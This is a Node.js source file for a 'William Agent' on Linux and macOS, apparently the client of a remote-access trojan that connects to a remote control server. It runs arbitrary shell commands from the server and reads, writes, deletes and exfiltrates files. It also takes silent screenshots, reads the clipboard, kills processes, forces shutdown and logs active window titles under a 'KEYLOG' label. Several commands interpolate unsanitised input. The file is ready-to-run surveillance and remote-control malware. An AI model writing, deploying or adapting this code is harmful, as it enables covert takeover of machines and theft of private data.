/**
 * William Agent — Linux / macOS
 * Run: node agent-linux.js
 * Or: SERVER_URL=https://xxx.railway.app node agent-linux.js
 */

const io = require('socket.io-client');
const { exec } = require('child_process');
const os = require('os');
const fs = require('fs');
const path = require('path');

const SERVER_URL = process.env.SERVER_URL || 'https://YOUR_RAILWAY_URL.up.railway.app';
const AUTH_TOKEN = process.env.AUTH_TOKEN || 'william_secret_2024';
const IS_MAC = os.platform() === 'darwin';

const socket = io(SERVER_URL, {
  reconnection: true,
  reconnectionDelay: 3000,
  reconnectionAttempts: Infinity,
  transports: ['websocket']
});

socket.on('connect', () => {
  console.log('[+] Connected');
  socket.emit('agent:register', {
    token: AUTH_TOKEN,
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    cpus: os.cpus().length,
    totalMem: fmt(os.totalmem()),
    username: os.userInfo().username
  });
});

// SHELL
socket.on('agent:shell', ({ command, sessionId }) => {
  exec(command, { shell: '/bin/bash', cwd: os.homedir(), timeout: 30000, maxBuffer: 5*1024*1024 },
    (err, stdout, stderr) => {
      socket.emit('agent:shell:output', { output: stdout||stderr||err?.message||'', sessionId });
    });
});

// FILE OPS
socket.on('agent:ls', ({ dirPath }) => {
  try {
    const entries = fs.readdirSync(dirPath, { withFileTypes: true }).map(e => {
      let size = 0;
      try { if (!e.isDirectory()) size = fs.statSync(path.join(dirPath, e.name)).size; } catch {}
      return { name: e.name, path: path.join(dirPath, e.name), isDir: e.isDirectory(), size };
    });
    socket.emit('agent:ls:result', { entries, dirPath });
  } catch (err) {
    socket.emit('agent:ls:result', { entries: [], error: err.message, dirPath });
  }
});

socket.on('agent:readfile', ({ filePath }) => {
  try { socket.emit('agent:readfile:result', { content: fs.readFileSync(filePath,'utf8') }); }
  catch (e) { socket.emit('agent:readfile:result', { content:'', error: e.message }); }
});

socket.on('agent:writefile', ({ filePath, content }) => {
  try {
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, content, 'utf8');
    socket.emit('agent:writefile:result', { success: true });
  } catch (e) { socket.emit('agent:writefile:result', { success: false, error: e.message }); }
});

socket.on('agent:deletefile', ({ filePath }) => {
  try {
    const s = fs.statSync(filePath);
    s.isDirectory() ? fs.rmdirSync(filePath,{recursive:true}) : fs.unlinkSync(filePath);
    socket.emit('agent:deletefile:result', { success: true });
  } catch (e) { socket.emit('agent:deletefile:result', { success: false, error: e.message }); }
});

socket.on('agent:download', ({ filePath }) => {
  try { socket.emit('agent:download:result', { filePath, data: fs.readFileSync(filePath).toString('base64') }); }
  catch (e) { socket.emit('agent:download:result', { filePath, error: e.message }); }
});

socket.on('agent:upload', ({ filePath, data }) => {
  try {
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, Buffer.from(data,'base64'));
    socket.emit('agent:upload:result', { success: true });
  } catch (e) { socket.emit('agent:upload:result', { success: false, error: e.message }); }
});

// SCREENSHOT
socket.on('agent:screenshot', () => {
  const tmp = path.join(os.tmpdir(),'ss_'+Date.now()+'.png');
  const cmd = IS_MAC
    ? `screencapture -x ${tmp}`
    : `import -window root ${tmp} 2>/dev/null || scrot ${tmp} 2>/dev/null || gnome-screenshot -f ${tmp}`;
  exec(cmd, (err) => {
    if (err || !fs.existsSync(tmp)) { socket.emit('agent:screenshot:result',{img:'',timestamp:Date.now()}); return; }
    const img = fs.readFileSync(tmp).toString('base64');
    fs.unlinkSync(tmp);
    socket.emit('agent:screenshot:result', { img, timestamp: Date.now() });
  });
});

// PROCESSES
socket.on('agent:processes', () => {
  const cmd = IS_MAC
    ? `ps aux | awk 'NR>1{print $2","$3","$4","$11}'`
    : `ps aux | awk 'NR>1{print $2","$3","$4","$11}'`;
  exec(cmd, (err, stdout) => {
    if (err) { socket.emit('agent:processes:result',{processes:[],error:err.message}); return; }
    const processes = stdout.trim().split('\n').map(line => {
      const [pid,cpu,mem,...nameParts] = line.split(',');
      return { pid:parseInt(pid), cpu:parseFloat(cpu)||0, mem:parseFloat(mem)||0, name:nameParts.join(' ')||'' };
    }).filter(p=>p.pid).sort((a,b)=>b.cpu-a.cpu);
    socket.emit('agent:processes:result', { processes });
  });
});

socket.on('agent:killprocess', ({ pid }) => {
  exec(`kill -9 ${pid}`, err => {
    socket.emit('agent:killprocess:result', { success: !err, pid, error: err?.message });
  });
});

// SYSINFO
socket.on('agent:sysinfo', () => {
  const cpus = os.cpus();
  const info = {
    hostname: os.hostname(), platform: os.platform(), arch: os.arch(),
    uptime: fmtUp(os.uptime()), totalMem: fmt(os.totalmem()),
    freeMem: fmt(os.freemem()), usedMem: fmt(os.totalmem()-os.freemem()),
    memPercent: Math.round((1-os.freemem()/os.totalmem())*100)+'%',
    cpuModel: cpus[0]?.model||'Unknown', cpuCores: cpus.length,
    username: os.userInfo().username, homedir: os.homedir(), nodeVersion: process.version
  };
  socket.emit('agent:sysinfo:result', { info });
});

// CLIPBOARD
socket.on('agent:clipboard:get', () => {
  const cmd = IS_MAC ? 'pbpaste' : 'xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null';
  exec(cmd, (err, stdout) => { socket.emit('agent:clipboard:result', { content: stdout||'', error: err?.message }); });
});

socket.on('agent:clipboard:set', ({ text }) => {
  const cmd = IS_MAC ? `echo '${text.replace(/'/g,"'\\''")}'|pbcopy` : `echo '${text.replace(/'/g,"'\\''")}'|xclip -selection clipboard`;
  exec(cmd);
});

// ALERT / URL / POWER
socket.on('agent:alert', ({ message }) => {
  const cmd = IS_MAC
    ? `osascript -e 'display alert "William Panel" message "${message.replace(/"/g,'\\"')}"'`
    : `notify-send "William Panel" "${message}" || zenity --info --text="${message}"`;
  exec(cmd);
});

socket.on('agent:openurl', ({ url }) => {
  exec(IS_MAC ? `open "${url}"` : `xdg-open "${url}"`);
});

socket.on('agent:poweraction', ({ action }) => {
  const cmds = {
    shutdown: IS_MAC?'sudo shutdown -h now':'sudo shutdown -h now',
    restart: IS_MAC?'sudo shutdown -r now':'sudo reboot',
    sleep: IS_MAC?'pmset sleepnow':'systemctl suspend',
    logoff: IS_MAC?'sudo pkill -KILL -u $(whoami)':'gnome-session-quit --logout'
  };
  if (cmds[action]) exec(cmds[action]);
});

// KEYLOG (active window polling)
setInterval(() => {
  const cmd = IS_MAC
    ? `osascript -e 'tell application "System Events" to name of first application process whose frontmost is true'`
    : `xdotool getwindowfocus getwindowname 2>/dev/null || xprop -id $(xprop -root 32x '\\t$0' _NET_ACTIVE_WINDOW 2>/dev/null|cut -f2) WM_NAME 2>/dev/null|cut -d'"' -f2`;
  exec(cmd, (err, stdout) => {
    if (!err && stdout.trim()) {
      socket.emit('agent:keylog', { keys: [`[WINDOW:${stdout.trim()}]`], timestamp: Date.now(), window: stdout.trim() });
    }
  });
}, 5000);

function fmt(b) {
  if(!b)return'0B';const k=1024,s=['B','KB','MB','GB','TB'];
  const i=Math.floor(Math.log(b)/Math.log(k));return(b/Math.pow(k,i)).toFixed(2)+s[i];
}
function fmtUp(s){const d=Math.floor(s/86400),h=Math.floor((s%86400)/3600),m=Math.floor((s%3600)/60);return`${d}d ${h}h ${m}m`;}

console.log(`[William Agent] → ${SERVER_URL}`);
